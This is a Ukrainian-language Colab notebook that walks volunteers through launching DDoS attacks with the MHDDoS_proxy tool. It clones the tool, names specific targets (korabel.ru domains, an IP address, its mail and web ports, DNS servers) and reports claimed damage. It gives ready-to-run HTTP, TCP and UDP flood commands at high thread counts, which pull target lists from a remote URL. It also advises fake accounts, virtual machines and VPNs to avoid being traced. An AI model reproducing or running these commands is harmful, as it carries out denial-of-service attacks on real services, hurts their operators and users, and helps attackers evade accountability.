# %% [markdown]
# <a href="https://colab.research.google.com/github/Van4ooo/Coloboration/blob/main/%D0%A1%D0%BB%D0%B0%D0%B2%D0%B0_%D0%A3%D0%BA%D1%80%D0%B0%D1%97%D0%BD%D1%96_%22%D1%82%D1%83%D1%82%D0%BE%D1%80_MHDDoS_proxy_Colaboratory%22.ipynb" target="_parent"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/></a>

# %% [markdown]
# # MHDDoS_proxy
#
# Переконайтеся, що ви зайшли з фейкового акаунта
# Рекомендовано робити все на віртульній машині
# Ось хороший [гайд](https://telegra.ph/Podgotovka-virtualnoj-rabochej-sredi-s-OS-Kali-LinuxProtonVPN-03-18) як це зробити від **Украинский жнец (DDoS)**
# <br>
# Тут вже все налаштовано, два кліка і атака пішла
# <br>
# Запускаємо код що під цим повідомленням, натискаємо:
# Ctrl + Enter, або збоку коду кнопку << **запуска** >>  вона схожа ка кнопку плей ютуба
# <br>
# Чєкаємо поки встановиться MHDDoS_proxy

# %%
# %cd ~
# %rm -rf mhddos_proxy &> /dev/null
# !git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
# %cd ~/mhddos_proxy
# !python3 -m pip install -r requirements.txt

# %% [markdown]
# ### Стосовно цілі
#
# Бачу рашисти ніяк не заспокояться, тому сьогодні продовжуємо атакувати сервіси перевізників. Цього разу під гарячу руку попадає сайт Корабел Ру😈<br>
#
#
# Не забувайте, що ми створили [софт](https://t.me/haydamaki/133), який повинен полегшити вам завдання.
# Особливо корисним буде для новеньких. <br><br>
#
# доміни:
# www.korabel.ru
# mail.korabel.ru
# reklama.korabel.ru
# 77.221.131.146
# 25/tcp | 80/tcp | 110/tcp | 143/tcp
# Завдано шкоди: 90% | 90% | 90% | 90%<br><br>
#
# DNS-servers:
# 185.48.236.12
# 185.48.236.41
# 53/udp
# 0% | 0% <br><br>
#
#
# ---
# <br>
#
#  ### Атаку можна запускати в декількох вкладках на одному акаунті
#
# Тут все аналогічно:
# [N1](https://colab.research.google.com/drive/14mdOCLZg9sUTxQ559s3BAfPBFYMSSBaH)
# [N2](https://colab.research.google.com/drive/1mQlYYX5qItbgLilO2tTQhR1UH1pj7ZxD)
# [N3](https://colab.research.google.com/drive/1F9Vty3YzOBbtq9xQhB0tOHIVuyNNQZm6)
#   <br><br>
# Відкриваємо декілька вкладок і в кожній запускаємо по одній атаці

# %% [markdown]
# ## HTTP attack
#
#
# ---
#
#
#  Якщо хочеш атаку по **Layer7**, тобто по http **(Запусти код нижче)**
#  Потужніша але повілніша, не така стабільна як по TCP

# %%
# !python runner.py -c http://goals.ddosukraine.com.ua/haydamaky/targets_http.txt -t 1000 --rpc 2000 --http-methods STRESS POST

# %% [markdown]
# ## TCP
#
#
# ---
#
#
#  Якщо хочеш атаку по **Layer4**, тобто по tcp **(Запусти код нижче)**
#  Вона не така потужна, але стабільна в роботі

# %%
# !python runner.py -c http://goals.ddosukraine.com.ua/haydamaky/targets_tcp.txt -t 1000 --rpc 2000 --table

# %% [markdown]
# ## UPD(Тут не запускати!!! запускати тільки на своїй машині обов'язково з VPN!)
#
#
# ---

# %%
# !python runner.py -c http://goals.ddosukraine.com.ua/haydamaky/targets_udp.txt -t 1000 --rpc 2000 --table

# %% [markdown]
# Вітаю браття та сестри атака успішно запущена.
# **Все буде Україна!**
